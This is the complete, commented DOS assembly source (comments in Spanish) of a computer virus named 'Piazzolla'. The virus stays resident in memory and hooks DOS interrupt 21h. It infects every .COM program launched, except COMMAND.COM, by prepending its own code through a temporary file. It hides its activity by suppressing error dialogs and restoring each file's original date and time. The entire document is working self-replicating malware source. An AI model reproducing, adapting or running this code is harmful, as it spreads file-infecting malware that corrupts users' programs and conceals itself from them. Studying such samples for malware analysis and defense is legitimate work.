;-----------------------------------------------------
;               Virus Piazzolla
; no sobreescribe, es residente, infecta .com, excepto Command.com
;-----------------------------------------------------

envir_seg       equ     2Ch
tamano          equ     offset comstart
identificador   equ     'ai'

seg_a    segment
   assume  cs:seg_a, ds:seg_a
   org     100h

instala  proc    far

start:
   jmp     short empezar

; --- bytes de Copyright -----------------------------------

    db      'P'
    dw      identificador
    db      'zzolla'
    db      0

empezar:
    mov     origax,ax  ; Guardar en origax el valor original del
                       ; registro ax
    mov     si,tamano  ; guarda en si el tama�o del virus
    mov     di,100h    ; en di pone 100h
    mov     ah,0DDh
    mov     cx,0FF00h  ; interrupcion 21h ah=funcion DDh
    sub     cx,tamano  ; Chequea si el virus est� en memoria
    int     21h        ; Si es as�, ubica el com original
                       ; donde deber�a estar y salta al com original

; ----- rutina de instalaci�n del virus
; ----- deja residente el virus e instala la interrupcion 21h modificada

    mov     ax,3521h         ; int. 21h, ah=funcion 35h
    int     21h              ; busca direccion de int 21h

    mov     int21hseg,es     ; guarda el viejo valor de la int 21h
    mov     int21hofs,bx     ; en variables

    mov     dx,offset int_21
    mov     ax,2521h
    int     21h               ; instala una int 21h modificada

    mov     sp,tamano
    mov     bx,tamano
    mov     ah,4Ah
    push    ds
    pop     es
    add     bx,0Fh
    shr     bx,1
    shr     bx,1
    shr     bx,1
    shr     bx,1
    mov     tamres,bx           ; reserva lugar para el
    int     21h                 ; codigo del virus en memoria

; busca el nombre con el que fue llamado el programa para ejecutarlo
; asi no se nota nada raro Busca en el environment block el nombre
; del programa. Est� despu�s del primer word 00 (o sea, un byte 0
; del ASCIZ de la �ltima variable de environment, y un byte 0
; que se�ala el final del environment)

    mov     cx,0FFFFh
    xor     ax,ax
    xor     di,di
    mov     es,ds:envir_seg

busca:
    repne   scasb               ; Repetir mientras zf=0 y cx>0
                                ; Scan es:[di] hasta que sea = ax (0)
    cmp     byte ptr es:[di],0
    je      encontro            ; si lo encontr�
    scasb                       ; Scan es:[di] hasta que sea = ax (0)
    jnz     busca               ; repetir hasta que lo encuentre

encontro:
    mov     dx,di
    add     dx,3               ; dx = di + 3 (el primer word es el nro
                               ; de strings de despues del environment)
    push    es
    pop     ds                 ; ds = es
    mov     bx,13Ah
    mov     ax,4B00h
    push    cs
    pop     es     ; es = cs
    pushf

    call    dword ptr cs:int21h  ; llama a la int 21h
                                 ; 4B00h load and execute
                                 ; ejecuta el programa huesped

    mov     ah,4Dh               ; obtiene el codigo de retorno
    int     21h                  ; para devolverlo luego de terminar

    mov     dx,cs:tamres
    mov     ah,31h
    int     21h                 ; termina y queda residente

instala         endp

;------ Handler de interrupci�n 21h tomada por el virus --------------
;------ Servicios: 0DDh (auto-check) 4B00h (exec load and execute) ---

int_21:
int_21h_entry   proc    far

    pushf                           ; guarda las flags en el stack
    cmp     ah,0DDh                 ; saltar si es rutina auto-check
    je      res_original            ; virus ya instalado
                                    ; ejecutar el programa huesped

    cmp     ax,4B00h         ; es exec? (load and execute)
    je      doexec           ; si se trata de ejecutar un programa
                             ; intenta infectarlo si es .com y no esta
                             ; previamente infectado

vuelta21h:                            ; vuelta a la int. 21h normal
    popf                         ; Pop flags, restaura las flags de lo
                                 ; que guard� en el stack
    jmp     dword ptr cs:int21h  ; como no hay nada que hacer, sigue con
                                 ; la int 21h del DOS

; restaura el programa original y lo ejecuta para que no se note nada raro

res_original:

    pop     ax       ; borra las flags del stack
    pop     ax       ; borra el offset de donde fue llamada la
                     ; int. del stack

    mov     ax,100h            ; el offset de donde empieza el
    mov     cs:origentryofs,ax ; programa es 100h

    pop     ax                 ; saca del stack el segmento donde
    mov     cs:origentryseg,ax ; empieza el programa

    rep     movsb            ; Repetir mientras cx>0 Mov [si] a es:[di]
                             ; Copia el resto del codigo
                             ; que sigue al virus (o sea, el programa
                             ; original) a partir de 100h para
                             ; devolverle el control
    xor     ax,ax
    push    ax               ; pone 0 en el tope del stack
    mov     ax,cs:origax     ; restaura lo que hab�a originalmente en ax
    jmp     dword ptr cs:origentry ; le da el control al programa original

;---- rutina de infecci�n ----------------------------

doexec:
    mov     cs:stackptr,sp      ; guarda en variables
    mov     cs:stackseg,ss      ; la direccion del stack actual

    push    cs
    pop     ss
    mov     sp,tamano           ; instala un stack temporario

    push    ax
    push    bx
    push    cx
    push    dx
    push    si
    push    di
    push    ds
    push    es               ; guarda los registros

    mov     ah,19h
    mov     cs:spsave,sp     ; guarda el sp en una variable
    int     21h              ; busca el drive default (0=a:)
    add     al,41h           ; convierte el numero de drive en letra

    mov     cs:drive2,al     ; arma los nombres del archivo para infectar
    mov     cs:drive,al      ; y el temporario de trabajo

    mov     di,offset victima     ; guarda el offset de la victima
    push    di                    ; en el stack

    mov     si,dx                 ; si apunta al nombre del archivo
                                  ; a ejecutar
    cmp     byte ptr [si+1],':'   ; �est� explicitado el drive en el
                                  ; nombre del archivo a ejecutar?
                                  ; compara el segundo byte con ':'
    jne     haydrive              ; salta si no es as�

    mov     al,[si]               ; si esta explicitado el drive
    mov     cs:drive2,al          ; usa el mismo para ambos
    mov     cs:drive,al           ; si no usa el default
    add     si,2
haydrive:

; ------- convertir el nombre del archivo a infectar a mayusculas

    push    cs
    pop     es                    ; es = cs
    mov     cx,3Fh                ; repetir 3Fh (63) veces

conversion:
    lodsb                ; copiar lo que hay en [si] en al
    cmp     al,'a'
    jb      nominusc     ; salta si es menor a 'a'
    cmp     al,'z'
    ja      nominusc     ; salta si es mayor a 'z'
    add     al,0E0h      ; convierto a may�sculas si est� entre 'a' y 'z'
nominusc:
    stosb                ; guardar al en es:[di]
    loop    conversion   ; Loop si cx > 0

; ----- verifica si el archivo a ejecutar es un .com

    pop     di         ; recupero el offest del nombre de la victima
    push    cs
    pop     ds         ; ds = cs
    mov     cx,40h
    mov     al,'.'
    repne   scasb      ; Repetir mientras zf=0 y cx>0 hasta es:[di] = al
    mov     cx,3
    mov     si,offset extension
    repe    cmpsb    ; Repetir mientras zf=1 y cx>0 Cmp [si] con es:[di]
    jz      es_com   ; salta si es igual a com, o sea, si es .com

    jmp     vuelta             ; no es .com, no hay nada que hacer

a_hecho:
    jmp     hecho     ; atajo para que alcance el salto condicional

; ----------------- verifica si es el command.com

es_com:
    sub     di,0Bh
    mov     cx,7
    mov     si,offset sistema
    repe    cmpsb     ; Repetir mientras zf=1 y cx>0 Cmp [si] con es:[di]
    jnz     nocommand ; si no es command.com sigo
    jmp     vuelta    ; es command.com, no infectar

; --- primero, toma int 24h para que si hay un error mientras
; --- se infecta no se note

nocommand:
    mov     ax,3524h         ; int. 21h, ah=funcion 35h
    int     21h              ; busca direccion de int 21h

    mov     int24hseg,es     ; guarda el viejo valor de la int 24h
    mov     int24hofs,bx     ; en variables

    mov     ax,2524h
    mov     dx,offset int_24  ; instala su rutina de interrupcion 24h
    int     21h

; Abre el archivo que se trata de ejecutar, lee y guarda los 9 primeros bytes,
; guarda su fecha y hora y lo cierra

    mov     dx,offset path
    mov     ax,3D00h
    int     21h              ; abrir archivo

    mov     bx,ax
    mov     cx,9
    mov     dx,offset buffer
    mov     ah,3Fh
    int     21h              ; leer el archivo en el buffer
    jc      a_hecho          ; si hay algun error, volver

    mov     ax,5700h
    int     21h              ; leer fecha y hora del archivo
    mov     fecha,dx
    mov     hora,cx          ; y guardarlos en variables

    mov     ah,3Eh
    int     21h              ; cerrar el archivo

;  crea un archivo temporario y escribe este codigo

    cmp     buffer,'ZM'     ; 'MZ', busca el identificador de .exe
    je      hecho_a         ; Si es un .exe con extensi�n .com
                            ; no infectar

    cmp     virus_ID,identificador  ; salta si es igual, el archivo ya
    je      a_hecho                 ; esta contaminado, no reinfectar

; Si no est� contaminado crea un temp (Piazzoll.$$$) con el virus --------

    xor     cx,cx
    mov     ah,3Ch
    mov     dx,offset drive2
    int     21h                     ; crea el archivo temporario
    jc      a_hecho                 ; si hay error, volver

    mov     bx,ax            ; pone el file handle en bx
    mov     ah,40h
    mov     cx,tamano-100h
    mov     dx,100h          ; escribir el virus desde memoria
    int     21h              ; en piazzoll.$$$

    cmp     ax,cx            ; si no pudo escribir el virus completo
    jne     hecho_a          ; se va

; Ac� copia el viejo c�digo al temp -------------------------------------------

    mov     fhandle,bx       ; guardar el handle del temp
    mov     ax,3D00h
    mov     dx,offset path
    int     21h              ; abrir el programa a infectar
    jc      hecho_a          ; si hay error, volver

    mov     bx,ax            ; pone el file handle en bx
    push    bx               ; y lo guarda en el stack
    mov     ah,48h
    mov     bx,500h
    int     21h              ; reserva memoria, 20k

    pop     bx               ; recupera handle
    mov     ds,ax
    xor     dx,dx            ; apunta ds:dx a la memoria que reserv�

leer_1:
    mov     ah,3Fh
    mov     cx,5000h        ; lee 20k del prog. a infectar
    int     21h             ; en la memoria que reserv�
    jc      hecho_a         ; si hubieron problemas, volver
    cmp     ax,0            ; si no ley� nada ya termin� de copiar
    je      yaesta          ; as� que termina

    mov     cx,ax
    xchg    bx,cs:fhandle    ; usa el handle del temp
    mov     ah,40h
    int     21h              ; escribe en el temp lo que ley�

    cmp     ax,cx     ; si no escribi� la misma cantidad que hab�a le�do
    jne     hecho_a   ; vuelve

    xchg    bx,cs:fhandle    ; vuelve a usar el handle del programa
    jmp     short leer_1     ; sigue copiando hasta terminar

hecho_a:
    jmp     hecho     ; atajo para que alcance el salto condicional

; termin� de copiar e infectar

yaesta:
    push    ds
    pop     es               ; es = ds
    mov     ah,49h
    int     21h              ; devuelve la memoria pedida

    push    cs
    push    cs
    pop     es
    pop     ds               ; ds = cs ; es = cs
    mov     ah,3Eh
    int     21h              ; cierra el archivo
    jc      hecho_a          ; si hay problemas, se va

    mov     bx,fhandle
    mov     ah,3Eh
    int     21h              ; cierra el otro archivo
    jc      hecho_a          ; si hay problemas, se va

    mov     ax,4301h
    mov     dx,offset path
    xor     cx,cx            ; pone en 0 los atributos del archivo
    int     21h              ; para evitar que est� como Read Only

    mov     ah,41h
    int     21h              ; borra el programa original sin infectar

; ----- esto es basicamente lo mismo que lo anterior, vuelve a copiar
; ----- el archivo temporario con el nombre del infectado

    mov     dx,offset path
    mov     ah,3Ch
    xor     cx,cx
    int     21h
    jc      hecho
    mov     fhandle,bx
    mov     dx,offset drive2
    mov     ax,3D00h
    int     21h
    jc      hecho
    mov     bx,ax
    push    bx
    mov     bx,500h
    mov     ah,48h
    int     21h
    pop     bx
    xor     dx,dx
    mov     ds,ax
leer_2:
    mov     cx,5000h
    mov     ah,3Fh
    int     21h
    jc      hecho
    cmp     ax,0
    je      yaesta_2
    mov     cx,ax
    xchg    bx,cs:fhandle
    mov     ah,40h
    int     21h
    cmp     ax,cx
    jne     hecho
    xchg    bx,cs:fhandle
    jmp     short leer_2
yaesta_2:
    push    ds
    pop     es
    mov     ah,49h
    int     21h
    push    cs
    push    cs
    pop     es
    pop     ds
    mov     ah,3Eh
    int     21h
    jc      hecho
    mov     bx,fhandle
    mov     ax,5701h
    mov     dx,fecha
    mov     cx,hora
    int     21h
    mov     ah,3Eh
    int     21h
    jc      hecho
    mov     dx,offset drive2
    mov     ah,41h
    int     21h

; todo est� hecho: se restaura la int 24h de manejo de errores

hecho:
    mov     ds,int24hseg
    mov     dx,int24hofs
    mov     ax,2524h
    int     21h              ; instala la vieja int. 24h

vuelta:
    push    cs
    pop     ds
    mov     sp,cs:spsave
    pop     es
    pop     ds
    pop     di
    pop     si
    pop     dx
    pop     cx
    pop     bx
    pop     ax                ; restaura los registros y el stack
    mov     ss,cs:stackseg
    mov     sp,cs:stackptr    ; sigue con la interrupcion 21h para que
                              ; �sta se encargue de ejecutar el
    jmp     vuelta21h         ; programa ya infectado

int_21h_entry   endp

; -------------- Handler de interrupci�n 24 (errores del DOS) -------

int_24:
int_24h_entry   proc    far

    xor     al,al            ; devuelve 0, sin errores
    iret                     ; volver de la interrupci�n

int_24h_entry   endp

; siguen todas las variables --------------------------------------------

stackptr  dw      0  ; stack pointer
stackseg  dw      0  ; stack segment (cambiados por int21 handler)

int21h:
int21hofs  dw      0
int21hseg  dw      0  ; direcci�n de la ex-int 21h

int24h:
int24hofs  dw      0
int24hseg  dw      0  ; direcci�n de la int 24h normal

origentry:
origentryofs  dw      0
origentryseg  dw      0   ; punto de entrada original

origax  dw      0   ; ax original del programa

spsave  dw      0   ; stack pointer guardado por int 21h handler

fecha   dw      0
hora    dw      0   ; fecha y hora del programa a infectar

tamres  dw      0   ; tama�o del c�digo residente

path:
drive   db      0
        db      ':'
victima:   db      64 dup (0)  ; programa a infectar

sistema:   db      'COMMAND'   ; para no infectar al command.com
extension  db      'COM'       ; para infectar s�lo .com

buffer  dw      0
        db      0
virus_ID   dw      0
           db      4 dup (0)  ; buffer de datos para chequear infecci�n

fhandle    dw      0          ; handle usado por el virus

drive2     db      0
           db      ':Piazzoll.$$$'
           db      0                ; ASCIIZ string de archivo temporario

int21hstack  db 60 dup (0)     ; Stack que usa el handler de la int21h

comstart   db      0CDh, 20h ; programa .com falso, solo termina.

seg_a           ends
end    start
